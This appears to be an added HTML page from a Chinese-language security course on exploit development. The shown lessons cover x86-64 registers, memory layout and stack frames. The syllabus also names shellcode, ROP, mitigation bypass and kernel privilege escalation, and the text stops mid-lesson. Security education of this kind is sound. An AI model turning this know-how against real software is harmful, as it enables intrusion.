@@ -1,0 +1,1418 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Stage 09 — 漏洞研究與利用開發 | SEC_TRACK</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#060c0b;--bg2:#091210;--bg3:#0e1916;--sur:#162320;--bdr:#1f332e;
+  --acc:#2dd4bf;--acc2:#1aaa97;--txt:#dcf0ed;--txt2:#6fa89e;--txt3:#3a6058;
+  --red:#f05252;--grn:#3ecf8e;--ylw:#fbbf24;--org:#f97316;--pur:#a78bfa;--rose:#fb7185;--cyn:#67e8f9;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Noto Sans TC',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;}
+body::before{content:'';position:fixed;inset:0;background:
+  radial-gradient(ellipse 55% 35% at 10% 0%,rgba(45,212,191,.05) 0%,transparent 55%),
+  radial-gradient(ellipse 40% 28% at 90% 100%,rgba(26,170,151,.04) 0%,transparent 55%);
+  pointer-events:none;z-index:0;}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 36px;background:rgba(6,12,11,.95);backdrop-filter:blur(14px);border-bottom:1px solid var(--bdr);}
+.n-logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.95rem;color:var(--acc);text-decoration:none;}
+.n-logo span{color:var(--txt3);}
+.n-mid{display:flex;align-items:center;gap:10px;}
+.s-pill{font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:3px 10px;border-radius:20px;background:rgba(45,212,191,.1);color:var(--acc);border:1px solid rgba(45,212,191,.28);}
+.n-sname{font-size:.8rem;color:var(--txt2);}
+.n-back{font-size:.8rem;color:var(--txt3);text-decoration:none;transition:color .2s;}
+.n-back:hover{color:var(--acc);}
+.layout{display:grid;grid-template-columns:280px 1fr;min-height:100vh;padding-top:60px;}
+.sidebar{position:sticky;top:60px;height:calc(100vh - 60px);overflow-y:auto;background:var(--bg2);border-right:1px solid var(--bdr);display:flex;flex-direction:column;z-index:10;}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--bdr);}
+.sb-h{padding:22px 22px 16px;border-bottom:1px solid var(--bdr);flex-shrink:0;}
+.sb-tag{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--acc);letter-spacing:.14em;text-transform:uppercase;margin-bottom:6px;}
+.sb-title{font-size:.88rem;font-weight:700;line-height:1.45;margin-bottom:13px;}
+.sb-meta{display:flex;gap:16px;}
+.sm-item{display:flex;flex-direction:column;gap:2px;}
+.sm-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:700;color:var(--acc);}
+.sm-key{font-size:.62rem;color:var(--txt3);letter-spacing:.06em;text-transform:uppercase;}
+.sb-nav{flex:1;overflow-y:auto;padding:6px 0;}
+.ch-btn{width:100%;display:flex;align-items:center;gap:9px;padding:9px 22px;background:none;border:none;border-bottom:1px solid rgba(31,51,46,.7);color:var(--txt2);font-family:'Noto Sans TC',sans-serif;font-size:.79rem;font-weight:500;cursor:pointer;text-align:left;transition:color .18s,background .18s;}
+.ch-btn:hover{color:var(--txt);background:var(--bg3);}
+.ch-btn.cact{color:var(--acc);}
+.ch-num{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);min-width:26px;flex-shrink:0;}
+.ch-btn.cact .ch-num{color:var(--acc);}
+.ch-arr{font-size:.52rem;color:var(--txt3);transition:transform .2s;flex-shrink:0;}
+.ch-btn.copen .ch-arr{transform:rotate(90deg);}
+.ls-list{display:none;flex-direction:column;background:rgba(0,0,0,.15);}
+.ls-list.lopen{display:flex;}
+.ls-btn{display:flex;align-items:flex-start;gap:9px;padding:7px 22px 7px 44px;background:none;border:none;border-bottom:1px solid rgba(31,51,46,.4);color:var(--txt3);font-family:'Noto Sans TC',sans-serif;font-size:.74rem;cursor:pointer;text-align:left;width:100%;transition:color .18s,background .18s;line-height:1.4;}
+.ls-btn:hover{color:var(--txt2);background:rgba(45,212,191,.03);}
+.ls-btn.lact{color:var(--acc);background:rgba(45,212,191,.06);}
+.ls-btn.ldone{color:var(--txt3);}
+.ls-dot{width:5px;height:5px;border-radius:50%;background:var(--bdr);flex-shrink:0;margin-top:5px;transition:background .2s;}
+.ls-btn.lact .ls-dot,.ls-btn.ldone .ls-dot{background:var(--acc);}
+.sb-f{padding:13px 22px;border-top:1px solid var(--bdr);flex-shrink:0;}
+.pr{display:flex;justify-content:space-between;font-size:.68rem;color:var(--txt3);margin-bottom:6px;}
+.pt{height:3px;background:var(--bdr);border-radius:2px;overflow:hidden;}
+.pf{height:100%;background:var(--acc);border-radius:2px;transition:width .4s;}
+.main{position:relative;z-index:1;display:flex;flex-direction:column;}
+.lh{padding:38px 56px 30px;border-bottom:1px solid var(--bdr);background:linear-gradient(180deg,rgba(45,212,191,.03) 0%,transparent 100%);}
+.lh-crumb{font-family:'JetBrains Mono',monospace;font-size:.63rem;color:var(--txt3);letter-spacing:.08em;margin-bottom:11px;}
+.lh-crumb em{color:var(--acc);font-style:normal;}
+.lh-title{font-size:1.6rem;font-weight:800;letter-spacing:-.02em;line-height:1.2;margin-bottom:11px;}
+.lh-chips{display:flex;gap:8px;flex-wrap:wrap;}
+.chip{padding:3px 11px;border-radius:20px;font-size:.67rem;font-family:'JetBrains Mono',monospace;letter-spacing:.04em;border:1px solid var(--bdr);color:var(--txt3);}
+.chip.ac{border-color:rgba(45,212,191,.4);color:var(--acc);}
+.cw{padding:38px 56px 80px;max-width:880px;}
+.cb{display:none;}
+.cb.on{display:block;animation:rise .25s ease both;}
+@keyframes rise{from{opacity:0;transform:translateY(7px);}to{opacity:1;transform:none;}}
+h2{font-size:1.25rem;font-weight:800;letter-spacing:-.01em;margin:36px 0 13px;color:var(--txt);display:flex;align-items:center;gap:10px;}
+h2::before{content:'';display:inline-block;width:3px;height:1.1em;border-radius:2px;background:var(--acc);flex-shrink:0;}
+h2:first-child{margin-top:0;}
+h3{font-size:.98rem;font-weight:700;margin:22px 0 9px;color:var(--txt);}
+p{font-size:.9rem;line-height:1.85;color:var(--txt2);margin-bottom:11px;font-weight:300;}
+strong{color:var(--txt);font-weight:600;}
+code{font-family:'JetBrains Mono',monospace;font-size:.8em;background:var(--sur);border:1px solid var(--bdr);padding:1px 6px;border-radius:3px;color:var(--acc);}
+.note{border-left:3px solid;padding:13px 17px;margin:18px 0;border-radius:0 4px 4px 0;}
+.note-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.12em;text-transform:uppercase;font-weight:700;margin-bottom:6px;}
+.note p{margin:0;font-size:.86rem;line-height:1.7;}
+.note.tip{border-color:var(--acc);background:rgba(45,212,191,.06);}
+.note.tip .note-lbl{color:var(--acc);}
+.note.warn{border-color:var(--ylw);background:rgba(251,191,36,.06);}
+.note.warn .note-lbl{color:var(--ylw);}
+.note.sec{border-color:var(--grn);background:rgba(62,207,142,.06);}
+.note.sec .note-lbl{color:var(--grn);}
+.note.danger{border-color:var(--red);background:rgba(240,82,82,.07);}
+.note.danger .note-lbl{color:var(--red);}
+.note.law{border-color:var(--pur);background:rgba(167,139,250,.07);}
+.note.law .note-lbl{color:var(--pur);}
+.note.mem{border-color:var(--cyn);background:rgba(103,232,249,.05);}
+.note.mem .note-lbl{color:var(--cyn);}
+.cblock{background:#030806;border:1px solid var(--bdr);border-radius:6px;margin:16px 0;overflow:hidden;}
+.ctop{display:flex;align-items:center;justify-content:space-between;padding:7px 15px;background:rgba(10,22,19,.8);border-bottom:1px solid var(--bdr);}
+.clang{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);letter-spacing:.1em;text-transform:uppercase;}
+.ccopy{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);background:none;border:none;cursor:pointer;transition:color .2s;}
+.ccopy:hover{color:var(--acc);}
+pre{padding:16px 20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.75;color:#c8dedd;}
+pre .kw{color:#c792ea;}pre .fn{color:#82aaff;}pre .st{color:#c3e88d;}pre .cm{color:#1f3834;font-style:italic;}
+pre .nu{color:#f78c6c;}pre .tg{color:#f07178;}pre .at{color:#ffcb6b;}
+pre .sl{color:#89ddff;}pre .op{color:#89ddff;}pre .hl{background:rgba(45,212,191,.12);border-radius:2px;padding:0 2px;}
+pre .addr{color:#2dd4bf;}pre .ins{color:#c3e88d;}pre .reg{color:#ffcb6b;}
+.tbl{overflow-x:auto;margin:16px 0;}
+table.t{width:100%;border-collapse:collapse;font-size:.82rem;}
+table.t th{background:var(--sur);padding:9px 14px;text-align:left;font-size:.63rem;font-family:'JetBrains Mono',monospace;color:var(--txt3);letter-spacing:.08em;text-transform:uppercase;border:1px solid var(--bdr);}
+table.t td{padding:9px 14px;border:1px solid var(--bdr);color:var(--txt2);font-weight:300;vertical-align:top;line-height:1.55;}
+table.t tr:hover td{background:var(--bg3);}
+.mc{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--acc);}
+.kg{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin:16px 0;}
+.kt{background:var(--bg2);padding:14px 17px;}
+.kt-n{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--acc);font-weight:700;margin-bottom:5px;}
+.kt-d{font-size:.79rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.ilist{display:flex;flex-direction:column;border:1px solid var(--bdr);border-radius:4px;overflow:hidden;margin:16px 0;}
+.il-item{display:flex;align-items:flex-start;gap:13px;padding:12px 17px;border-bottom:1px solid var(--bdr);transition:background .15s;}
+.il-item:last-child{border-bottom:none;}
+.il-item:hover{background:var(--bg3);}
+.il-num{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--acc);min-width:24px;flex-shrink:0;padding-top:2px;font-weight:700;}
+.il-txt{font-size:.85rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.il-txt strong{color:var(--txt);}
+.atkflow{display:flex;flex-direction:column;gap:3px;margin:18px 0;}
+.af-step{display:flex;align-items:flex-start;gap:13px;padding:13px 16px;background:var(--sur);border:1px solid var(--bdr);border-radius:4px;position:relative;}
+.af-step::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--bdr);border-radius:4px 0 0 4px;}
+.af-step.s1::before{background:var(--acc);}
+.af-step.s2::before{background:var(--ylw);}
+.af-step.s3::before{background:var(--org);}
+.af-step.s4::before{background:var(--red);}
+.af-step.s5::before{background:var(--pur);}
+.af-step.s6::before{background:var(--grn);}
+.af-n{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);font-weight:700;min-width:44px;flex-shrink:0;padding-top:2px;letter-spacing:.04em;}
+.af-t{font-size:.82rem;font-weight:700;color:var(--txt);margin-bottom:4px;}
+.af-d{font-size:.78rem;color:var(--txt2);line-height:1.55;font-weight:300;}
+.quiz{background:var(--bg3);border:1px solid var(--bdr);border-radius:6px;padding:22px;margin:26px 0;}
+.q-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--ylw);letter-spacing:.12em;text-transform:uppercase;margin-bottom:10px;}
+.q-q{font-size:.9rem;font-weight:600;margin-bottom:13px;line-height:1.5;color:var(--txt);}
+.q-opts{display:flex;flex-direction:column;gap:6px;}
+.qo{display:flex;align-items:flex-start;gap:10px;padding:8px 13px;border:1px solid var(--bdr);border-radius:4px;cursor:pointer;font-size:.83rem;color:var(--txt2);transition:all .18s;line-height:1.5;}
+.qo:hover{border-color:var(--acc);color:var(--txt);}
+.qo.ok{border-color:var(--acc);background:rgba(45,212,191,.07);color:var(--acc);}
+.qo.bad{border-color:var(--red);background:rgba(240,82,82,.07);color:var(--red);}
+.qo-k{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);min-width:16px;padding-top:1px;flex-shrink:0;}
+.q-exp{display:none;margin-top:12px;padding:11px 14px;background:rgba(45,212,191,.05);border-left:2px solid var(--acc);border-radius:0 4px 4px 0;font-size:.82rem;color:var(--txt2);line-height:1.65;}
+.q-exp.on{display:block;}
+.done-banner{background:linear-gradient(135deg,rgba(45,212,191,.07),rgba(26,170,151,.05));border:1px solid rgba(45,212,191,.2);border-radius:6px;padding:28px;margin:34px 0 14px;text-align:center;}
+.done-banner h3{font-size:1.1rem;font-weight:800;color:var(--acc);margin-bottom:8px;}
+.done-banner p{font-size:.87rem;margin-bottom:20px;}
+.btn-row{display:flex;gap:11px;justify-content:center;flex-wrap:wrap;}
+.btn-p{display:inline-block;padding:10px 24px;background:var(--acc);color:#060c0b;text-decoration:none;font-weight:700;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-p:hover{background:#4de8d4;transform:translateY(-1px);}
+.btn-g{display:inline-block;padding:10px 24px;border:1px solid var(--bdr);color:var(--txt2);text-decoration:none;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-g:hover{border-color:var(--acc);color:var(--acc);}
+.lnav{display:flex;justify-content:space-between;align-items:center;padding:22px 56px;border-top:1px solid var(--bdr);background:var(--bg2);position:sticky;bottom:0;z-index:5;}
+.lb{display:flex;align-items:center;gap:7px;padding:8px 18px;border:1px solid var(--bdr);border-radius:4px;background:none;color:var(--txt2);font-size:.82rem;cursor:pointer;font-family:'Noto Sans TC',sans-serif;transition:all .18s;}
+.lb:hover:not(:disabled){border-color:var(--acc);color:var(--acc);}
+.lb.pri{background:var(--acc);color:#060c0b;border-color:var(--acc);font-weight:700;}
+.lb.pri:hover:not(:disabled){background:#4de8d4;}
+.lb:disabled{opacity:.2;cursor:not-allowed;}
+.ln-mid{text-align:center;}
+.ln-cnt{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);}
+.ln-sub{font-size:.75rem;color:var(--txt3);margin-top:3px;max-width:260px;}
+@media(max-width:900px){.layout{grid-template-columns:1fr;}.sidebar{position:static;height:auto;}.lh,.cw{padding-left:20px;padding-right:20px;}.lnav{padding:16px 20px;}.kg{grid-template-columns:1fr;}.ln-sub{display:none;}}
+</style>
+</head>
+<body>
+<nav>
+  <a href="index.html" class="n-logo">SEC<span>_</span>TRACK</a>
+  <div class="n-mid"><span class="s-pill">STAGE 09</span><span class="n-sname">漏洞研究與利用開發</span></div>
+  <a href="index.html" class="n-back">&#8592; 首頁</a>
+</nav>
+<div class="layout">
+<aside class="sidebar">
+  <div class="sb-h">
+    <div class="sb-tag">STAGE 09 · 1個月</div>
+    <div class="sb-title">漏洞研究<br>漏洞利用開發（Exploit Dev）</div>
+    <div class="sb-meta">
+      <div class="sm-item"><span class="sm-val">5</span><span class="sm-key">章節</span></div>
+      <div class="sm-item"><span class="sm-val">22</span><span class="sm-key">課程</span></div>
+      <div class="sm-item"><span class="sm-val">1月</span><span class="sm-key">時長</span></div>
+    </div>
+  </div>
+  <div class="sb-nav">
+    <div><button class="ch-btn copen cact" onclick="toggleCh(this,'ch1')"><span class="ch-num">CH1</span><span class="ch-name">二進制基礎</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list lopen" id="ch1">
+      <button class="ls-btn lact" onclick="go('l1-1',this)"><span class="ls-dot"></span>CPU 架構：x86-64 暫存器與定址</button>
+      <button class="ls-btn" onclick="go('l1-2',this)"><span class="ls-dot"></span>記憶體佈局：Stack / Heap / BSS</button>
+      <button class="ls-btn" onclick="go('l1-3',this)"><span class="ls-dot"></span>組合語言速讀：關鍵指令集</button>
+      <button class="ls-btn" onclick="go('l1-4',this)"><span class="ls-dot"></span>GDB / pwndbg 調試環境搭建</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch2')"><span class="ch-num">CH2</span><span class="ch-name">Stack 溢位攻擊</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch2">
+      <button class="ls-btn" onclick="go('l2-1',this)"><span class="ls-dot"></span>Stack Buffer Overflow 原理</button>
+      <button class="ls-btn" onclick="go('l2-2',this)"><span class="ls-dot"></span>返回地址覆蓋與 Shellcode</button>
+      <button class="ls-btn" onclick="go('l2-3',this)"><span class="ls-dot"></span>ROP（Return-Oriented Programming）</button>
+      <button class="ls-btn" onclick="go('l2-4',this)"><span class="ls-dot"></span>繞過 ASLR / NX / Stack Canary</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch3')"><span class="ch-num">CH3</span><span class="ch-name">Heap 漏洞</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch3">
+      <button class="ls-btn" onclick="go('l3-1',this)"><span class="ls-dot"></span>Heap 記憶體管理：ptmalloc2 機制</button>
+      <button class="ls-btn" onclick="go('l3-2',this)"><span class="ls-dot"></span>Use-After-Free（UAF）漏洞</button>
+      <button class="ls-btn" onclick="go('l3-3',this)"><span class="ls-dot"></span>Heap Overflow 與 tcache 攻擊</button>
+      <button class="ls-btn" onclick="go('l3-4',this)"><span class="ls-dot"></span>Double Free 與 fastbin 攻擊</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch4')"><span class="ch-num">CH4</span><span class="ch-name">漏洞研究方法</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch4">
+      <button class="ls-btn" onclick="go('l4-1',this)"><span class="ls-dot"></span>模糊測試（Fuzzing）：AFL++ / libFuzzer</button>
+      <button class="ls-btn" onclick="go('l4-2',this)"><span class="ls-dot"></span>靜態分析：CodeQL / Semgrep</button>
+      <button class="ls-btn" onclick="go('l4-3',this)"><span class="ls-dot"></span>漏洞披露與 CVE 流程</button>
+      <button class="ls-btn" onclick="go('l4-4',this)"><span class="ls-dot"></span>1-day 分析：Patch Diffing</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch5')"><span class="ch-num">CH5</span><span class="ch-name">Exploit 開發工具鏈</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch5">
+      <button class="ls-btn" onclick="go('l5-1',this)"><span class="ls-dot"></span>pwntools：Python Exploit 框架</button>
+      <button class="ls-btn" onclick="go('l5-2',this)"><span class="ls-dot"></span>ROPgadget / pwntools ROP 鏈構建</button>
+      <button class="ls-btn" onclick="go('l5-3',this)"><span class="ls-dot"></span>格式化字串漏洞（Format String）</button>
+      <button class="ls-btn" onclick="go('l5-4',this)"><span class="ls-dot"></span>CTF 練習：PWN 題型策略</button>
+      <button class="ls-btn" onclick="go('l5-5',this)"><span class="ls-dot"></span>Kernel Exploit 入門：LPE 技術</button>
+      <button class="ls-btn" onclick="go('l5-6',this)"><span class="ls-dot"></span>漏洞利用緩解技術全覽</button>
+    </div></div>
+  </div>
+  <div class="sb-f">
+    <div class="pr"><span>學習進度</span><span id="pct">0%</span></div>
+    <div class="pt"><div class="pf" id="pf" style="width:0%"></div></div>
+  </div>
+</aside>
+<main class="main">
+  <div class="lh">
+    <div class="lh-crumb" id="crumb">STAGE 09 &gt; CH1 &gt; <em>課程 1</em></div>
+    <h1 class="lh-title" id="ltitle">CPU 架構：x86-64 暫存器與定址</h1>
+    <div class="lh-chips">
+      <span class="chip ac" id="chip1">二進制基礎</span>
+      <span class="chip" id="chip2">30 分鐘</span>
+    </div>
+  </div>
+  <div class="cw">
+
+<!-- ===== CH1: 二進制基礎 ===== -->
+
+<!-- L1-1 x86-64 暫存器 -->
+<div class="cb on" id="l1-1">
+<h2>CPU 架構：x86-64 暫存器與定址</h2>
+<p>漏洞利用開發的第一步是理解程式在 CPU 層面如何運作。x86-64 是目前最主流的 64 位架構，掌握其暫存器體系和定址模式是分析程式行為和構建 Exploit 的根本。</p>
+
+<h3>x86-64 通用暫存器</h3>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>64-bit</th><th>32-bit</th><th>16-bit</th><th>8-bit</th><th>主要用途</th></tr></thead>
+    <tbody>
+      <tr><td class="mc">RAX</td><td class="mc">EAX</td><td class="mc">AX</td><td class="mc">AL/AH</td><td>累加器；函式<strong>返回值</strong>（syscall 返回值）</td></tr>
+      <tr><td class="mc">RBX</td><td class="mc">EBX</td><td class="mc">BX</td><td class="mc">BL/BH</td><td>通用；在 x86-64 Linux ABI 中為 callee-saved</td></tr>
+      <tr><td class="mc">RCX</td><td class="mc">ECX</td><td class="mc">CX</td><td class="mc">CL/CH</td><td>計數器；函式<strong>第 4 個參數</strong>（Linux syscall: 第 4 個 = R10）</td></tr>
+      <tr><td class="mc">RDX</td><td class="mc">EDX</td><td class="mc">DX</td><td class="mc">DL/DH</td><td>資料暫存器；函式<strong>第 3 個參數</strong></td></tr>
+      <tr><td class="mc">RSI</td><td class="mc">ESI</td><td class="mc">SI</td><td class="mc">SIL</td><td>來源索引；函式<strong>第 2 個參數</strong></td></tr>
+      <tr><td class="mc">RDI</td><td class="mc">EDI</td><td class="mc">DI</td><td class="mc">DIL</td><td>目標索引；函式<strong>第 1 個參數</strong>（最重要！）</td></tr>
+      <tr><td class="mc">RSP</td><td class="mc">ESP</td><td class="mc">SP</td><td class="mc">SPL</td><td><strong>Stack Pointer</strong>：始終指向目前 Stack 頂端</td></tr>
+      <tr><td class="mc">RBP</td><td class="mc">EBP</td><td class="mc">BP</td><td class="mc">BPL</td><td><strong>Base Pointer</strong>：指向目前 Stack Frame 的底部</td></tr>
+      <tr><td class="mc">RIP</td><td class="mc">EIP</td><td class="mc">—</td><td class="mc">—</td><td><strong>Instruction Pointer</strong>：指向下一條要執行的指令（控制流的核心）</td></tr>
+      <tr><td class="mc">R8–R15</td><td class="mc">R8D–R15D</td><td class="mc">R8W–R15W</td><td class="mc">R8B–R15B</td><td>額外通用暫存器；R8/R9 = 第 5/6 個函式參數</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="note mem">
+  <div class="note-lbl">x86-64 函式呼叫約定（System V AMD64 ABI）</div>
+  <p>在 Linux x86-64 中，函式的前六個整數/指標參數依序放入：<strong>RDI, RSI, RDX, RCX, R8, R9</strong>。返回值放在 <strong>RAX</strong>。超過六個參數則通過 Stack 傳遞（從右到左壓棧）。系統呼叫（syscall）使用略不同的約定：呼叫號在 RAX，參數依序為 RDI, RSI, RDX, R10, R8, R9。<br><br>記憶口訣：<strong>Di Si Dx Cx 8 9</strong>（RDI → RSI → RDX → RCX → R8 → R9）</p>
+</div>
+
+<h3>常用定址模式（AT&T 語法 vs Intel 語法）</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">x86-64 定址模式（Intel 語法）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">; ─── 立即數定址 ───</span>
+<span class="ins">mov</span>  <span class="reg">rax</span>, <span class="nu">0x10</span>          <span class="cm">; rax = 16（立即數直接賦值）</span>
+
+<span class="cm">; ─── 暫存器定址 ───</span>
+<span class="ins">mov</span>  <span class="reg">rax</span>, <span class="reg">rbx</span>           <span class="cm">; rax = rbx（暫存器間傳遞）</span>
+
+<span class="cm">; ─── 記憶體直接定址 ───</span>
+<span class="ins">mov</span>  <span class="reg">rax</span>, [<span class="addr">0x601050</span>]   <span class="cm">; rax = *0x601050（讀取該地址的值）</span>
+
+<span class="cm">; ─── 暫存器間接定址 ───</span>
+<span class="ins">mov</span>  <span class="reg">rax</span>, [<span class="reg">rbx</span>]        <span class="cm">; rax = *rbx（讀取 rbx 指向的記憶體）</span>
+<span class="ins">mov</span>  [<span class="reg">rbx</span>], <span class="reg">rax</span>        <span class="cm">; *rbx = rax（寫入 rbx 指向的記憶體）</span>
+
+<span class="cm">; ─── 基址+偏移定址 ───</span>
+<span class="ins">mov</span>  <span class="reg">rax</span>, [<span class="reg">rbp</span> - <span class="nu">0x8</span>]  <span class="cm">; 讀取 rbp-8 處（函式局部變數）</span>
+<span class="ins">mov</span>  <span class="reg">rax</span>, [<span class="reg">rdi</span> + <span class="nu">0x10</span>] <span class="cm">; 讀取結構體成員（偏移 0x10）</span>
+
+<span class="cm">; ─── 基址+索引+比例定址（陣列訪問）───</span>
+<span class="ins">mov</span>  <span class="reg">rax</span>, [<span class="reg">rbx</span> + <span class="reg">rcx</span>*<span class="nu">8</span>] <span class="cm">; rax = array[rcx]（每個元素 8 bytes）</span>
+
+<span class="cm">; ─── RIP 相對定址（x86-64 特有，用於 PIE）───</span>
+<span class="ins">lea</span>  <span class="reg">rdi</span>, [<span class="reg">rip</span> + <span class="addr">0x80</span>]  <span class="cm">; rdi = 下條指令地址 + 0x80（相對定址）</span></pre>
+</div>
+</div>
+
+<!-- L1-2 記憶體佈局 -->
+<div class="cb" id="l1-2">
+<h2>記憶體佈局：Stack / Heap / BSS</h2>
+<p>理解 Linux 進程的記憶體佈局是漏洞分析的基礎。不同的記憶體段有不同的屬性（讀/寫/執行），各種漏洞的本質都是打破了這些區域的邊界或讀寫屬性限制。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Linux 進程記憶體佈局（高地址→低地址）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="addr">0xFFFFFFFFFFFFFFFF</span>  ┌─────────────────────────────┐
+                    │         Kernel Space          │  <span class="cm">核心空間（用戶不可訪問）</span>
+<span class="addr">0x00007FFFFFFFFFFF</span>  ├─────────────────────────────┤
+                    │           Stack               │  <span class="cm">棧（向低地址增長）</span>
+                    │  local vars, ret addr, args   │  <span class="cm">局部變數、返回地址、函式參數</span>
+                    │            ↓                  │  <span class="cm">每個函式呼叫建立 Stack Frame</span>
+                    ├─────────────────────────────┤
+                    │           (gap)               │  <span class="cm">ASLR 隨機化的間隔</span>
+                    ├─────────────────────────────┤
+                    │   Memory Mapped Region        │  <span class="cm">mmap 映射（共享庫 libc.so 等）</span>
+                    │   (libc, ld, shared libs)     │
+                    ├─────────────────────────────┤
+                    │            ↑                  │  <span class="cm">Heap 向高地址增長</span>
+                    │           Heap                │  <span class="cm">動態配置（malloc/free）</span>
+                    ├─────────────────────────────┤
+                    │           BSS                 │  <span class="cm">未初始化全域變數（清零）</span>
+                    ├─────────────────────────────┤
+                    │           Data                │  <span class="cm">已初始化全域/靜態變數</span>
+                    ├─────────────────────────────┤
+                    │           Text (.text)        │  <span class="cm">可執行代碼（通常唯讀）</span>
+<span class="addr">0x0000000000400000</span>  └─────────────────────────────┘  <span class="cm">程式載入地址（無 PIE 時固定）</span>
+
+<span class="cm"># ─── 查看運行中進程的記憶體佈局 ───</span>
+cat /proc/[PID]/maps        <span class="cm"># 顯示所有記憶體映射（段地址、權限）</span>
+<span class="cm"># 輸出範例：</span>
+<span class="cm"># 400000-401000 r-xp 00000000 08:01 131073  /path/to/program  ← .text（唯讀+可執行）</span>
+<span class="cm"># 601000-602000 rw-p 00001000 08:01 131073  /path/to/program  ← .data/.bss（讀寫）</span>
+<span class="cm"># 7fff...a000-7fff...b000 rwxp [stack]                        ← Stack（讀寫，無執行）</span>
+
+<span class="cm"># 在 GDB 中查看</span>
+vmmap           <span class="cm"># pwndbg 指令</span>
+info proc mappings  <span class="cm"># 原生 GDB</span></pre>
+</div>
+
+<h3>Stack Frame 結構</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">函式呼叫時的 Stack Frame 佈局</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">; 呼叫 foo(arg1, arg2) 後，foo 函式內部的 Stack 佈局：</span>
+
+高地址  ┌──────────────────┐
+        │  第 7+ 個參數     │  <span class="cm">（超過 6 個參數才在這裡）</span>
+        ├──────────────────┤
+        │  Return Address  │  ← <span class="hl">rbp + 0x08</span>  <span class="cm">呼叫者的下一條指令地址（覆蓋此處 = 控制執行流）</span>
+        ├──────────────────┤
+        │  Saved RBP       │  ← <span class="hl">rbp + 0x00</span>  <span class="cm">呼叫者的 RBP（函式序言中 push rbp）</span>
+        ├──────────────────┤
+        │  [Stack Canary]  │  ← rbp - 0x08  <span class="cm">（若有 stack canary 保護）</span>
+        ├──────────────────┤
+        │  Local Variable  │  ← rbp - 0x10  <span class="cm">char buf[64] 會在 rbp-0x48 到 rbp-0x09</span>
+        │   char buf[64]   │
+        │                  │  ← rsp         <span class="cm">RSP 始終指向 Stack 頂（最低地址）</span>
+低地址  └──────────────────┘
+
+<span class="cm">; Stack Overflow 目標：溢位 buf，覆蓋 Return Address，控制程式跳轉到攻擊者指定地址</span>
+<span class="cm">; 需要覆蓋的字節數 = buf 大小 + saved RBP 大小 + 返回地址偏移</span></pre>
+</div>
+</div>
+
+<!-- L1-3 組合語言速讀 -->
+<div class="cb" id="l1-3">
+<h2>組合語言速讀：關鍵指令集</h2>
+<p>Exploit 開發不需要精通組合語言，但需要能夠「閱讀」反組譯代碼，理解程式的控制流和資料操作。以下是最常見的指令集，覆蓋 90% 以上的 CTF PWN 題分析需求。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">x86-64 關鍵指令速查（Intel 語法）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">; ─── 資料移動 ───</span>
+<span class="ins">mov</span>  <span class="reg">dst</span>, <span class="reg">src</span>       <span class="cm">; dst = src（最常見指令）</span>
+<span class="ins">lea</span>  <span class="reg">dst</span>, [<span class="reg">src</span>]    <span class="cm">; dst = &src（Load Effective Address，計算地址但不讀取）</span>
+<span class="ins">push</span> <span class="reg">rax</span>           <span class="cm">; rsp -= 8; [rsp] = rax（壓棧）</span>
